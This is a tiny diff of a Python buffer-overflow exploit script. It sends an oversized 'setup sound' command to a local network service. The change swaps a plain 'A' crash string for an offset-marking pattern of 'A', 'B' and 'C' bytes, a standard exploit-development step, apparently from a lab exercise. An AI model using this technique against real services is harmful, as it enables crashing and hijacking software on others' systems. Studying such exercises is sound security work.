@@ -2,7 +2,7 @@
 import socket
 
 host = "127.0.0.1"
-crash = "\x41" * 4379
+crash = "\x41" * 4368 + "B" * 4 + "C" * 7
 
 buffer = "\x11(setup sound " + crash + "\x90\x00#"
 
